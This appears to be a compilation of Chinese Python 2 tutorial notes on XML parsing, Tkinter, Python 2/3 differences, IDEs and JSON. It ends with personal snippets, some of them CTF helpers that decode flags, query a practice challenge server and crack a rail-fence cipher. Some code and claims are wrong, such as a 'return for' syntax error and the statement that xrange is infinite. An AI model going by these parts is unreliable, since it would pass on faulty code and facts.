	而事件处理器则负责对事件作出相应,对传递的XML数据进行处理。

		1、对大型文件进行处理；
		2、只需要文件的部分内容，或者只需从文件中得到特定信息。
		3、想建立自己的对象模型的时候。

	在python中使用sax方式处理xml要先引入xml.sax中的parse函数，还有xml.sax.handler中的ContentHandler。
	ContentHandler类方法介绍

	characters(content)方法

	调用时机：

	从行开始，遇到标签之前，存在字符，content的值为这些字符串。

	从一个标签，遇到下一个标签之前， 存在字符，content的值为这些字符串。

	从一个标签，遇到行结束符之前，存在字符，content的值为这些字符串。

	标签可以是开始标签，也可以是结束标签。

	startDocument()方法

	文档启动的时候调用。

	endDocument()方法

	解析器到达文档结尾时调用。

	startElement(name, attrs)方法

	遇到XML开始标签时调用，name是标签的名字，attrs是标签的属性值字典。

	endElement(name)方法

	遇到XML结束标签时调用。
	make_parser方法

	以下方法创建一个新的解析器对象并返回。

	xml.sax.make_parser( [parser_list] )

	参数说明:

		parser_list - 可选参数，解析器列表

	parser方法

	以下方法创建一个 SAX 解析器并解析xml文档：

	xml.sax.parse( xmlfile, contenthandler[, errorhandler])

	参数说明:

		xmlfile - xml文件名
		contenthandler - 必须是一个ContentHandler的对象
		errorhandler - 如果指定该参数，errorhandler必须是一个SAX ErrorHandler对象

	parseString方法

	parseString方法创建一个XML解析器并解析xml字符串：

	xml.sax.parseString(xmlstring, contenthandler[, errorhandler])

	参数说明:

		xmlstring - xml字符串
		contenthandler - 必须是一个ContentHandler的对象
		errorhandler - 如果指定该参数，errorhandler必须是一个SAX ErrorHandler对象

	Python 解析XML实例

	#!/usr/bin/python
	# -*- coding: UTF-8 -*-

	import xml.sax

	class MovieHandler( xml.sax.ContentHandler ):
	   def __init__(self):
		  self.CurrentData = ""
		  self.type = ""
		  self.format = ""
		  self.year = ""
		  self.rating = ""
		  self.stars = ""
		  self.description = ""

	   # 元素开始事件处理
	   def startElement(self, tag, attributes):
		  self.CurrentData = tag
		  if tag == "movie":
			 print "*****Movie*****"
			 title = attributes["title"]
			 print "Title:", title

	   # 元素结束事件处理
	   def endElement(self, tag):
		  if self.CurrentData == "type":
			 print "Type:", self.type
		  elif self.CurrentData == "format":
			 print "Format:", self.format
		  elif self.CurrentData == "year":
			 print "Year:", self.year
		  elif self.CurrentData == "rating":
			 print "Rating:", self.rating
		  elif self.CurrentData == "stars":
			 print "Stars:", self.stars
		  elif self.CurrentData == "description":
			 print "Description:", self.description
		  self.CurrentData = ""

	   # 内容事件处理
	   def characters(self, content):
		  if self.CurrentData == "type":
			 self.type = content
		  elif self.CurrentData == "format":
			 self.format = content
		  elif self.CurrentData == "year":
			 self.year = content
		  elif self.CurrentData == "rating":
			 self.rating = content
		  elif self.CurrentData == "stars":
			 self.stars = content
		  elif self.CurrentData == "description":
			 self.description = content
	  
	if ( __name__ == "__main__"):
	   
	   # 创建一个 XMLReader
	   parser = xml.sax.make_parser()
	   # turn off namepsaces
	   parser.setFeature(xml.sax.handler.feature_namespaces, 0)

	   # 重写 ContextHandler
	   Handler = MovieHandler()
	   parser.setContentHandler( Handler )
	   
	   parser.parse("movies.xml")

	以上代码执行结果如下：

	*****Movie*****
	Title: Enemy Behind
	Type: War, Thriller
	Format: DVD
	Year: 2003
	Rating: PG
	Stars: 10
	Description: Talk about a US-Japan war
	*****Movie*****
	Title: Transformers
	Type: Anime, Science Fiction
	Format: DVD
	Year: 1989
	Rating: R
	Stars: 8
	Description: A schientific fiction
	*****Movie*****
	Title: Trigun
	Type: Anime, Action
	Format: DVD
	Rating: PG
	Stars: 10
	Description: Vash the Stampede!
	*****Movie*****
	Title: Ishtar
	Type: Comedy
	Format: VHS
	Rating: PG
	Stars: 2
	Description: Viewable boredom

	完整的 SAX API 文档请查阅Python SAX APIs
	使用xml.dom解析xml

	文件对象模型（Document Object Model，简称DOM），是W3C组织推荐的处理可扩展置标语言的标准编程接口。

	一个 DOM 的解析器在解析一个 XML 文档时，一次性读取整个文档，把文档中所有元素保存在内存中的一个树结构里，之后你可以利用DOM 提供的不同的函数来读取或修改文档的内容和结构，也可以把修改过的内容写入xml文件。

	python中用xml.dom.minidom来解析xml文件，实例如下：

	#!/usr/bin/python
	# -*- coding: UTF-8 -*-

	from xml.dom.minidom import parse
	import xml.dom.minidom

	# 使用minidom解析器打开 XML 文档
	DOMTree = xml.dom.minidom.parse("movies.xml")
	collection = DOMTree.documentElement
	if collection.hasAttribute("shelf"):
	   print "Root element : %s" % collection.getAttribute("shelf")

	# 在集合中获取所有电影
	movies = collection.getElementsByTagName("movie")

	# 打印每部电影的详细信息
	for movie in movies:
	   print "*****Movie*****"
	   if movie.hasAttribute("title"):
		  print "Title: %s" % movie.getAttribute("title")

	   type = movie.getElementsByTagName('type')[0]
	   print "Type: %s" % type.childNodes[0].data
	   format = movie.getElementsByTagName('format')[0]
	   print "Format: %s" % format.childNodes[0].data
	   rating = movie.getElementsByTagName('rating')[0]
	   print "Rating: %s" % rating.childNodes[0].data
	   description = movie.getElementsByTagName('description')[0]
	   print "Description: %s" % description.childNodes[0].data

	以上程序执行结果如下：

	Root element : New Arrivals
	*****Movie*****
	Title: Enemy Behind
	Type: War, Thriller
	Format: DVD
	Rating: PG
	Description: Talk about a US-Japan war
	*****Movie*****
	Title: Transformers
	Type: Anime, Science Fiction
	Format: DVD
	Rating: R
	Description: A schientific fiction
	*****Movie*****
	Title: Trigun
	Type: Anime, Action
	Format: DVD
	Rating: PG
	Description: Vash the Stampede!
	*****Movie*****
	Title: Ishtar
	Type: Comedy
	Format: VHS
	Rating: PG
	Description: Viewable boredom

	完整的 DOM API 文档请查阅Python DOM APIs。
	https://docs.python.org/3/library/xml.dom.html

	
Python GUI编程(Tkinter)
	Python 提供了多个图形开发界面的库，几个常用 Python GUI 库如下：

		Tkinter： Tkinter 模块(Tk 接口)是 Python 的标准 Tk GUI 工具包的接口 .Tk 和 Tkinter 可以在大多数的 Unix 平台下使用,同样可以应用在 Windows 和 Macintosh 系统里。Tk8.0 的后续版本可以实现本地窗口风格,并良好地运行在绝大多数平台中。

		wxPython：wxPython 是一款开源软件，是 Python 语言的一套优秀的 GUI 图形库，允许 Python 程序员很方便的创建完整的、功能键全的 GUI 用户界面。

		Jython：Jython 程序可以和 Java 无缝集成。除了一些标准模块，Jython 使用 Java 的模块。Jython 几乎拥有标准的Python 中不依赖于 C 语言的全部模块。比如，Jython 的用户界面将使用 Swing，AWT或者 SWT。Jython 可以被动态或静态地编译成 Java 字节码。

	Tkinter 编程

	Tkinter 是 Python 的标准 GUI 库。Python 使用 Tkinter 可以快速的创建 GUI 应用程序。

	由于 Tkinter 是内置到 python 的安装包中、只要安装好 Python 之后就能 import Tkinter 库、而且 IDLE 也是用 Tkinter 编写而成、对于简单的图形界面 Tkinter 还是能应付自如。

		注意：Python3.x 版本使用的库名为 tkinter,即首写字母 T 为小写。

		import tkinter

	创建一个GUI程序

		1、导入 Tkinter 模块
		2、创建控件
		3、指定这个控件的 master， 即这个控件属于哪一个
		4、告诉 GM(geometry manager) 有一个控件产生了。

	实例:

	#!/usr/bin/python
	# -*- coding: UTF-8 -*-

	import Tkinter
	top = Tkinter.Tk()
	# 进入消息循环
	top.mainloop()

	以上代码执行结果如下图:

	tkwindow

	实例2：

	#!/usr/bin/python
	# -*- coding: UTF-8 -*-

	from Tkinter import *           # 导入 Tkinter 库
	root = Tk()                     # 创建窗口对象的背景色
									# 创建两个列表
	li     = ['C','python','php','html','SQL','java']
	movie  = ['CSS','jQuery','Bootstrap']
	listb  = Listbox(root)          #  创建两个列表组件
	listb2 = Listbox(root)
	for item in li:                 # 第一个小部件插入数据
		listb.insert(0,item)

	for item in movie:              # 第二个小部件插入数据
		listb2.insert(0,item)

	listb.pack()                    # 将小部件放置到主窗口中
	listb2.pack()
	root.mainloop()                 # 进入消息循环

	以上代码执行结果如下图:
	Tkinter 组件

	Tkinter的提供各种控件，如按钮，标签和文本框，一个GUI应用程序中使用。这些控件通常被称为控件或者部件。

	目前有15种Tkinter的部件。我们提出这些部件以及一个简短的介绍，在下面的表:
	控件	描述
	Button	按钮控件；在程序中显示按钮。
	Canvas	画布控件；显示图形元素如线条或文本
	Checkbutton	多选框控件；用于在程序中提供多项选择框
	Entry	输入控件；用于显示简单的文本内容
	Frame	框架控件；在屏幕上显示一个矩形区域，多用来作为容器
	Label	标签控件；可以显示文本和位图
	Listbox	列表框控件；在Listbox窗口小部件是用来显示一个字符串列表给用户
	Menubutton	菜单按钮控件，由于显示菜单项。
	Menu	菜单控件；显示菜单栏,下拉菜单和弹出菜单
	Message	消息控件；用来显示多行文本，与label比较类似
	Radiobutton	单选按钮控件；显示一个单选的按钮状态
	Scale	范围控件；显示一个数值刻度，为输出限定范围的数字区间
	Scrollbar	滚动条控件，当内容超过可视化区域时使用，如列表框。.
	Text	文本控件；用于显示多行文本
	Toplevel	容器控件；用来提供一个单独的对话框，和Frame比较类似
	Spinbox	输入控件；与Entry类似，但是可以指定输入范围值
	PanedWindow	PanedWindow是一个窗口布局管理的插件，可以包含一个或者多个子控件。
	LabelFrame	labelframe 是一个简单的容器控件。常用与复杂的窗口布局。
	tkMessageBox	用于显示你应用程序的消息框。
	标准属性

	标准属性也就是所有控件的共同属性，如大小，字体和颜色等等。
	属性 	描述
	Dimension 	控件大小；
	Color 	控件颜色；
	Font 	控件字体；
	Anchor 	锚点；
	Relief 	控件样式；
	Bitmap 	位图；
	Cursor 	光标；
	几何管理

	Tkinter控件有特定的几何状态管理方法，管理整个控件区域组织，一下是Tkinter公开的几何管理类：包、网格、位置
	几何方法 	描述
	pack() 	包装；
	grid() 	网格；
	place() 	位置；
	

Python2.x与3​​.x版本区别
	Python的3​​.0版本，常被称为Python 3000，或简称Py3k。相对于Python的早期版本，这是一个较大的升级。

	为了不带入过多的累赘，Python 3.0在设计的时候没有考虑向下相容。

	许多针对早期Python版本设计的程式都无法在Python 3.0上正常执行。

	为了照顾现有程式，Python 2.6作为一个过渡版本，基本使用了Python 2.x的语法和库，同时考虑了向Python 3.0的迁移，允许使用部分Python 3.0的语法与函数。

	新的Python程式建议使用Python 3.0版本的语法。

	除非执行环境无法安装Python 3.0或者程式本身使用了不支援Python 3.0的第三方库。目前不支援Python 3.0的第三方库有Twisted, py2exe, PIL等。

	大多数第三方库都正在努力地相容Python 3.0版本。即使无法立即使用Python 3.0，也建议编写相容Python 3.0版本的程式，然后使用Python 2.6, Python 2.7来执行。

	Python 3.0的变化主要在以下几个方面:
	print 函数

	print语句没有了，取而代之的是print()函数。 Python 2.6与Python 2.7部分地支持这种形式的print语法。在Python 2.6与Python 2.7里面，以下三种形式是等价的：

	print "fish"
	print ("fish") #注意print后面有个空格
	print("fish") #print()不能带有任何其它参数

	然而，Python 2.6实际已经支持新的print()语法：

	from __future__ import print_function
	print("fish", "panda", sep=', ')

	Unicode

	Python 2 有 ASCII str() 类型，unicode() 是单独的，不是 byte 类型。

	现在， 在 Python 3，我们最终有了 Unicode (utf-8) 字符串，以及一个字节类：byte 和 bytearrays。

	由于 Python3.X 源码文件默认使用utf-8编码，这就使得以下代码是合法的：

	>>> 中国 = 'china' 
	>>>print(中国) 
	china

	Python 2.x

	>>> str = "我爱北京天安门"
	>>> str
	'\xe6\x88\x91\xe7\x88\xb1\xe5\x8c\x97\xe4\xba\xac\xe5\xa4\xa9\xe5\xae\x89\xe9\x97\xa8'
	>>> str = u"我爱北京天安门"
	>>> str
	u'\u6211\u7231\u5317\u4eac\u5929\u5b89\u95e8'

	Python 3.x

	>>> str = "我爱北京天安门"
	>>> str
	'我爱北京天安门'

	除法运算

	Python中的除法较其它语言显得非常高端，有套很复杂的规则。Python中的除法有两个运算符，/和//

	首先来说/除法:

	在python 2.x中/除法就跟我们熟悉的大多数语言，比如Java啊C啊差不多，整数相除的结果是一个整数，把小数部分完全忽略掉，浮点数除法会保留小数点的部分得到一个浮点数的结果。

	在python 3.x中/除法不再这么做了，对于整数之间的相除，结果也会是浮点数。

	Python 2.x:

	>>> 1 / 2
	0
	>>> 1.0 / 2.0
	0.5

	Python 3.x:

	>>> 1/2
	0.5

	而对于//除法，这种除法叫做floor除法，会对除法的结果自动进行一个floor操作，在python 2.x和python 3.x中是一致的。

	python 2.x:

	>>> -1 // 2
	-1

	python 3.x:

	>>> -1 // 2
	-1

	注意的是并不是舍弃小数部分，而是执行floor操作，如果要截取小数部分，那么需要使用math模块的trunc函数

	python 3.x:

	>>> import math
	>>> math.trunc(1 / 2)
	0
	>>> math.trunc(-1 / 2)
	0

	异常

	在 Python 3 中处理异常也轻微的改变了，在 Python 3 中我们现在使用 as 作为关键词。

	捕获异常的语法由 except exc, var 改为 except exc as var。

	使用语法except (exc1, exc2) as var可以同时捕获多种类别的异常。 Python 2.6已经支持这两种语法。

		1. 在2.x时代，所有类型的对象都是可以被直接抛出的，在3.x时代，只有继承自BaseException的对象才可以被抛出。
		2. 2.x raise语句使用逗号将抛出对象类型和参数分开，3.x取消了这种奇葩的写法，直接调用构造函数抛出对象即可。 

	在2.x时代，异常在代码中除了表示程序错误，还经常做一些普通控制结构应该做的事情，在3.x中可以看出，设计者让异常变的更加专一，只有在错误发生的情况才能去用异常捕获语句来处理。
	xrange

	在 Python 2 中 xrange() 创建迭代对象的用法是非常流行的。比如： for 循环或者是列表/集合/字典推导式。

	这个表现十分像生成器（比如。"惰性求值"）。但是这个 xrange-iterable 是无穷的，意味着你可以无限遍历。

	由于它的惰性求值，如果你不得仅仅不遍历它一次，xrange() 函数 比 range() 更快（比如 for 循环）。尽管如此，对比迭代一次，不建议你重复迭代多次，因为生成器每次都从头开始。

	在 Python 3 中，range() 是像 xrange() 那样实现以至于一个专门的 xrange() 函数都不再存在（在 Python 3 中 xrange() 会抛出命名异常）。

	import timeit

	n = 10000
	def test_range(n):
		return for i in range(n):
			pass

	def test_xrange(n):
		for i in xrange(n):
			pass   

	Python 2

	print 'Python', python_version()

	print '\ntiming range()' 
	%timeit test_range(n)

	print '\n\ntiming xrange()' 
	%timeit test_xrange(n)

	Python 2.7.6

	timing range()
	1000 loops, best of 3: 433 µs per loop


	timing xrange()
	1000 loops, best of 3: 350 µs per loop

	Python 3

	print('Python', python_version())

	print('\ntiming range()')
	%timeit test_range(n)

	Python 3.4.1

	timing range()
	1000 loops, best of 3: 520 µs per loop

	print(xrange(10))
	---------------------------------------------------------------------------
	NameError                                 Traceback (most recent call last)
	<ipython-input-5-5d8f9b79ea70> in <module>()
	----> 1 print(xrange(10))

	NameError: name 'xrange' is not defined

	八进制字面量表示

	八进制数必须写成0o777，原来的形式0777不能用了；二进制必须写成0b111。

	新增了一个bin()函数用于将一个整数转换成二进制字串。 Python 2.6已经支持这两种语法。

	在Python 3.x中，表示八进制字面量的方式只有一种，就是0o1000。

	python 2.x

	>>> 0o1000
	512
	>>> 01000
	512

	python 3.x

	>>> 01000
	  File "<stdin>", line 1
		01000
			^
	SyntaxError: invalid token
	>>> 0o1000
	512

	不等运算符

	Python 2.x中不等于有两种写法 != 和 <>

	Python 3.x中去掉了<>, 只有!=一种写法，还好，我从来没有使用<>的习惯
	去掉了repr表达式``

	Python 2.x 中反引号``相当于repr函数的作用

	Python 3.x 中去掉了``这种写法，只允许使用repr函数，这样做的目的是为了使代码看上去更清晰么？不过我感觉用repr的机会很少，一般只在debug的时候才用，多数时候还是用str函数来用字符串描述对象。

	def sendMail(from_: str, to: str, title: str, body: str) -> bool:
		pass

	多个模块被改名（根据PEP8）
	旧的名字 	新的名字
	_winreg 	winreg
	ConfigParser 	configparser
	copy_reg 	copyreg
	Queue 	queue
	SocketServer 	socketserver
	repr 	reprlib

	StringIO模块现在被合并到新的io模组内。 new, md5, gopherlib等模块被删除。 Python 2.6已经支援新的io模组。

	httplib, BaseHTTPServer, CGIHTTPServer, SimpleHTTPServer, Cookie, cookielib被合并到http包内。

	取消了exec语句，只剩下exec()函数。 Python 2.6已经支援exec()函数。
	5.数据类型

	1）Py3.X去除了long类型，现在只有一种整型——int，但它的行为就像2.X版本的long

	2）新增了bytes类型，对应于2.X版本的八位串，定义一个bytes字面量的方法如下：

	>>> b = b'china' 
	>>> type(b) 
	<type 'bytes'> 

	str对象和bytes对象可以使用.encode() (str -> bytes) or .decode() (bytes -> str)方法相互转化。

	>>> s = b.decode() 
	>>> s 
	'china' 
	>>> b1 = s.encode() 
	>>> b1 
	b'china' 

	3）dict的.keys()、.items 和.values()方法返回迭代器，而之前的iterkeys()等函数都被废弃。同时去掉的还有 dict.has_key()，用 in替代它吧 。
	

Python IDE
	本文为大家推荐几款款不错的 Python IDE（集成开发环境），比较推荐 PyCharm，当然你可以根据自己的喜好来选择适合自己的 Python IDE。
	PyCharm

	PyCharm 是由 JetBrains 打造的一款 Python IDE。

	PyCharm 具备一般 Python IDE 的功能，比如：调试、语法高亮、项目管理、代码跳转、智能提示、自动完成、单元测试、版本控制等。

	另外，PyCharm 还提供了一些很好的功能用于 Django 开发，同时支持 Google App Engine，更酷的是，PyCharm 支持 IronPython。

	PyCharm 官方下载地址：http://www.jetbrains.com/pycharm/download/

	效果图查看：
	Sublime Text

	Sublime Text 具有漂亮的用户界面和强大的功能，例如代码缩略图，Python 的插件，代码段等。还可自定义键绑定，菜单和工具栏。

	Sublime Text 的主要功能包括：拼写检查，书签，完整的 Python API ， Goto 功能，即时项目切换，多选择，多窗口等等。

	Sublime Text 是一个跨平台的编辑器，同时支持 Windows、Linux、Mac OS X等操作系统。

	使用Sublime Text 2的插件扩展功能，你可以轻松的打造一款不错的 Python IDE，以下推荐几款插件（你可以找到更多）：

		CodeIntel：自动补全+成员/方法提示（强烈推荐）
		SublimeREPL：用于运行和调试一些需要交互的程序（E.G. 使用了Input()的程序）
		Bracket Highlighter：括号匹配及高亮
		SublimeLinter：代码pep8格式检查

	Eclipse+Pydev
	1、安装Eclipse

	Eclipse可以在它的官方网站Eclipse.org找到并下载，通常我们可以选择适合自己的Eclipse版本，比如Eclipse Classic。下载完成后解压到到你想安装的目录中即可。

	当然在执行Eclipse之前，你必须确认安装了Java运行环境,即必须安装JRE或JDK，你可以到（http://www.java.com/en/download/manual.jsp）找到JRE下载并安装。
	2、安装Pydev

	运行Eclipse之后，选择help-->Install new Software，如下图所示。

	点击Add，添加pydev的安装地址：http://pydev.org/updates/，如下图所示。

	Snap2

	完成后点击"ok"，接着点击PyDev的"+"，展开PyDev的节点，要等一小段时间，让它从网上获取PyDev的相关套件，当完成后会多出PyDev的相关套件在子节点里，勾选它们然后按next进行安装。如下图所示。

	安装完成后，重启Eclipse即可
	3、设置Pydev

	安装完成后，还需要设置一下PyDev，选择Window -> Preferences来设置PyDev。设置Python的路径，从Pydev的Interpreter - Python页面选择New

	会弹出一个窗口让你选择Python的安装位置，选择你安装Python的所在位置。

	完成之后PyDev就设置完成，可以开始使用。
	4、建立Python Project：

	安装好Eclipse+PyDev以后，我们就可以开始使用它来开发项目了。首先要创建一个项目，选择File -> New ->Pydev Project

	会弹出一个新窗口，填写Project Name，以及项目保存地址，然后点击next完成项目的创建。

	5、创建新的Pydev Module

	光有项目是无法执行的，接着必须创建新的Pydev Moudle，选择File -> New -> Pydev Module

	在弹出的窗口中选择文件存放位置以及Moudle Name，注意Name不用加.py，它会自动帮助我们添加。然后点击Finish完成创建。

	Snap10

	输入"hello world"的代码。

	6、执行程序

	程序写完后，我们可以开始执行程序,在上方的工具栏上面找到执行的按钮。

	之后会弹出一个让你选择执行方式的窗口，通常我们选择Python Run，开始执行程序。

	Snap14
	更多 Python IDE

	推荐10 款最好的 Python IDE：http://www.runoob.com/w3cnote/best-python-ide-for-developers.html

	当然还有非常多很棒的 Python IDE，你可以自由的选择，更多 Python IDE 请参阅：http://wiki.python.org/moin/PythonEditors
	Python2.x与3​​.x版本区别
	Python JSON
	笔记列表

		   corollacao

		  191***9365@qq.com

		我觉得对于像我这样的初学者用户，python官方的IDLE就是一个挺不错的选择。

		当然，IDLE其实也需要适应。

		其实我挺早之前就安装过官方自带的，后来每次打开都是打开到shell，觉得这样学编程简直是太折磨了，就放弃；后来觉得还是要学习python，就又下载下来，这次倒是找到了IDLE，然后觉得这个IDE也太简陋了吧，写了几句，运行出了些错误，就觉得不想学了。

		直到第三次，才找到了IDLE的感觉，知道怎么通过运行后的shell中的提示去修改编辑器中的代码，也知道怎么打开debuger模式，这个时候才觉得python自带的IDLE很适合自己。

		另外，觉得IDLE的有一套主题，叫IDLE Dark，很好看，配上fixedsys字体，是我现在最棒的感觉。这部分没有什么代码可以贴，不过希望我的这些感受和经历能够让更多人喜欢python和python自带的IDLE


Python JSON
	本章节我们将为大家介绍如何使用 Python 语言来编码和解码 JSON 对象。

	JSON(JavaScript Object Notation) 是一种轻量级的数据交换格式，易于人阅读和编写。
	JSON 函数

	使用 JSON 函数需要导入 json 库：import json。
	函数	描述
	json.dumps 	将 Python 对象编码成 JSON 字符串
	json.loads	将已编码的 JSON 字符串解码为 Python 对象
	json.dumps

	json.dumps 用于将 Python 对象编码成 JSON 字符串。
	语法

	json.dumps(obj, skipkeys=False, ensure_ascii=True, check_circular=True, allow_nan=True, cls=None, indent=None, separators=None, encoding="utf-8", default=None, sort_keys=False, **kw)

	实例

	以下实例将数组编码为 JSON 格式数据：

	#!/usr/bin/python
	import json

	data = [ { 'a' : 1, 'b' : 2, 'c' : 3, 'd' : 4, 'e' : 5 } ]

	json = json.dumps(data)
	print json

	以上代码执行结果为：

	[{"a": 1, "c": 3, "b": 2, "e": 5, "d": 4}]

	使用参数让 JSON 数据格式化输出：

	>>> import json
	>>> print json.dumps({'a': 'Runoob', 'b': 7}, sort_keys=True, indent=4, separators=(',', ': '))
	{
		"a": "Runoob",
		"b": 7
	}

	python 原始类型向 json 类型的转化对照表：
	Python 	JSON
	dict 	object
	list, tuple 	array
	str, unicode 	string
	int, long, float 	number
	True 	true
	False 	false
	None 	null
	json.loads

	json.loads 用于解码 JSON 数据。该函数返回 Python 字段的数据类型。
	语法

	json.loads(s[, encoding[, cls[, object_hook[, parse_float[, parse_int[, parse_constant[, object_pairs_hook[, **kw]]]]]]]])

	实例

	以下实例展示了Python 如何解码 JSON 对象：

	#!/usr/bin/python
	import json

	jsonData = '{"a":1,"b":2,"c":3,"d":4,"e":5}';

	text = json.loads(jsonData)
	print text

	以上代码执行结果为：

	{u'a': 1, u'c': 3, u'b': 2, u'e': 5, u'd': 4}

	json 类型转换到 python 的类型对照表：
	JSON 	Python
	object 	dict
	array 	list
	string 	unicode
	number (int) 	int, long
	number (real) 	float
	true 	True
	false 	False
	null 	None

	更多内容参考：https://docs.python.org/2/library/json.html。
	使用第三方库：Demjson

	Demjson 是 python 的第三方模块库，可用于编码和解码 JSON 数据，包含了 JSONLint 的格式化及校验功能。

	Github 地址：https://github.com/dmeranda/demjson

	官方地址：http://deron.meranda.us/python/demjson/
	环境配置

	在使用 Demjson 编码或解码 JSON 数据前，我们需要先安装 Demjson 模块。本教程我们会下载 Demjson 并安装：

	$ tar -xvzf demjson-2.2.3.tar.gz
	$ cd demjson-2.2.3
	$ python setup.py install

	更多安装介绍查看：http://deron.meranda.us/python/demjson/install
	JSON 函数
	函数	描述
	encode 	将 Python 对象编码成 JSON 字符串
	decode	将已编码的 JSON 字符串解码为 Python 对象
	encode

	Python encode() 函数用于将 Python 对象编码成 JSON 字符串。
	语法

	demjson.encode(self, obj, nest_level=0)

	实例

	以下实例将数组编码为 JSON 格式数据：

	#!/usr/bin/python
	import demjson

	data = [ { 'a' : 1, 'b' : 2, 'c' : 3, 'd' : 4, 'e' : 5 } ]

	json = demjson.encode(data)
	print json

	以上代码执行结果为：

	[{"a":1,"b":2,"c":3,"d":4,"e":5}]

	decode

	Python 可以使用 demjson.decode() 函数解码 JSON 数据。该函数返回 Python 字段的数据类型。
	语法

	demjson.decode(self, txt)

	实例

	以下实例展示了Python 如何解码 JSON 对象：

	#!/usr/bin/python
	import demjson

	json = '{"a":1,"b":2,"c":3,"d":4,"e":5}';

	text = demjson.decode(json)
	print  text

	以上代码执行结果为：

	{u'a': 1, u'c': 3, u'b': 2, u'e': 5, u'd': 4}


Python 100例

以下实例在Python2.7下测试通过：
http://www.runoob.com/python/python-100-examples.html
    Python 练习实例1
    Python 练习实例2
    Python 练习实例3
    Python 练习实例4
    Python 练习实例5
    Python 练习实例6
    Python 练习实例7
    Python 练习实例8
    Python 练习实例9
    Python 练习实例10
    Python 练习实例11
    Python 练习实例12
    Python 练习实例13
    Python 练习实例14
    Python 练习实例15
    Python 练习实例16
    Python 练习实例17
    Python 练习实例18
    Python 练习实例19
    Python 练习实例20
    Python 练习实例21
    Python 练习实例22
    Python 练习实例23
    Python 练习实例24
    Python 练习实例25
    Python 练习实例26
    Python 练习实例27
    Python 练习实例28
    Python 练习实例29
    Python 练习实例30
    Python 练习实例31
    Python 练习实例32
    Python 练习实例33
    Python 练习实例34
    Python 练习实例35
    Python 练习实例36
    Python 练习实例37
    Python 练习实例38
    Python 练习实例39
    Python 练习实例40
    Python 练习实例41
    Python 练习实例42
    Python 练习实例43
    Python 练习实例44
    Python 练习实例45
    Python 练习实例46
    Python 练习实例47
    Python 练习实例48
    Python 练习实例49
    Python 练习实例50
    Python 练习实例51
    Python 练习实例52
    Python 练习实例53
    Python 练习实例54
    Python 练习实例55
    Python 练习实例56
    Python 练习实例57
    Python 练习实例58
    Python 练习实例59
    Python 练习实例60
    Python 练习实例61
    Python 练习实例62
    Python 练习实例63
    Python 练习实例64
    Python 练习实例65
    Python 练习实例66
    Python 练习实例67
    Python 练习实例68
    Python 练习实例69
    Python 练习实例70
    Python 练习实例71
    Python 练习实例72
    Python 练习实例73
    Python 练习实例74
    Python 练习实例75
    Python 练习实例76
    Python 练习实例77
    Python 练习实例78
    Python 练习实例79
    Python 练习实例80
    Python 练习实例81
    Python 练习实例82
    Python 练习实例83
    Python 练习实例84
    Python 练习实例85
    Python 练习实例86
    Python 练习实例87
    Python 练习实例88
    Python 练习实例89
    Python 练习实例90
    Python 练习实例91
    Python 练习实例92
    Python 练习实例93
    Python 练习实例94
    Python 练习实例95
    Python 练习实例96
    Python 练习实例97
    Python 练习实例98
    Python 练习实例99
    Python 练习实例100



























































#python demo "hello world"
{
#!/usr/bin/python
# -*- coding: UTF-8 -*-
#coding=utf-8
# 文件名：test.py
print "Hello, World!";
print "你好，妹子";
}


#冒泡排序
#!/usr/bin/python
# -*- coding: UTF-8 -*-

array = [9,2,7,4,5,6,3,8,1,10]
L = len(array)
for i in range(L):
    for j in range(L-i):
        if array[L-j-1]<array[L-j-2]:
            array[L-j-1],array[L-j-2]=array[L-j-2],array[L-j-1]
for i in range(L):
    print array[i],


#列表操作demo
#!/usr/bin/python
# -*- coding: UTF-8 -*-

list01 = ['runoob', 786, 2.23, 'john', 70.2]
list02 = [123, 'john']

print list01
print list02

# 列表截取

print list01[0]
print list01[-1]
print list01[0:3]

# 列表重复

print list01 * 2

# 列表组合

print list01 + list02

# 获取列表长度

print len(list01)

# 删除列表元素

del list02[0]
print list02

# 元素是否存在于列表中

print 'john' in list02  # True

# 迭代

for i in list01:
    print i

# 比较两个列表的元素

print cmp(list01, list02)

# 列表最大/最小值

print max([0, 1, 2, 3, 4])
print min([0, 1])

# 将元组转换为列表

aTuple = (1,2,3,4)
list03 = list(aTuple)
print list03

# 在列表末尾添加新的元素

list03.append(5)
print list03

# 在列表末尾一次性追加另一个序列中的多个值（用新列表扩展原来的列表）

list03.extend(list01)
print list03

# 统计某个元素在列表中出现的次数

print list03.count(1)

# 从列表中找出某个值第一个匹配项的索引位置

print list03.index('john')

# 将对象插入列表

list03.insert(0, 'hello')
print list03

# 移除列表中的一个元素（默认最后一个元素），并且返回该元素的值

print list03.pop(0)
print list03

# 移除列表中某个值的第一个匹配项

list03.remove(1)
print list03

# 反向列表中元素

list03.reverse()
print list03

# 对原列表进行排序

list03.sort()
print list03






#zip解压缩及16进制编码
{
#! /usr/bin/env python
import zlib
import binascii
IDAT = "789C5D91011280400802BF04FFFF5C75294B5537738A21A27D1E49CFD17DB3937A92E7E603880A6D485100901FB0410153350DE83112EA2D51C54CE2E585B15A2FC78E8872F51C6FC1881882F93D372DEF78E665B0C36C529622A0A45588138833A170A2071DDCD18219DB8C0D465D8B6989719645ED9C11C36AE3ABDAEFCFC0ACF023E77C17C7897667".decode('hex')
#print IDAT
result = binascii.hexlify(zlib.decompress(IDAT))      
print result
#print result.decode('hex')
}



#PPL编程（画图）
{
#!/usr/bin/env python
import Image
MAX = 25
pic = Image.new("RGB",(MAX, MAX))
str = "1111111000100001101111111100000101110010110100000110111010100000000010111011011101001000000001011101101110101110110100101110110000010101011011010000011111111010101010101111111000000001011101110000000011010011000001010011101101111010101001000011100000000000101000000001001001101000100111001111011100111100001110111110001100101000110011100001010100011010001111010110000010100010110000011011101100100001110011100100001011111110100000000110101001000111101111111011100001101011011100000100001100110001111010111010001101001111100001011101011000111010011100101110100100111011011000110000010110001101000110001111111011010110111011011"
i=0
for y in range (0,MAX):
	for x in range (0,MAX):
		if(str[i] == '1'):
			pic.putpixel([x,y],(0, 0, 0))
		else:
			pic.putpixel([x,y],(255,255,255))
		i = i+1
pic.show()
pic.save("flag.png")     
}



#base64编解码，get/post请求
{
import requests, base64

rsp = requests.get('http://ctf5.shiyanbar.com/web/10/10.php')
tmp = base64.b64decode(rsp.headers['FLAG']).split(':')
rsp = requests.post('http://ctf5.shiyanbar.com/web/10/10.php', data={'key':tmp[-1]})
print rsp.text      
}



#栅栏密码破解
{
#!/usr/bin/env python
# -*- coding: gbk -*-
# -*- coding: utf_8 -*-
# Author: 蔚蓝行
# http://www.cnblogs.com/duanv
e = raw_input('请输入要解密的字符串\n')
elen = len(e)
field=[]
for i in range(2,elen):
            if(elen%i==0):
                field.append(i)

for f in field:
    b = elen / f
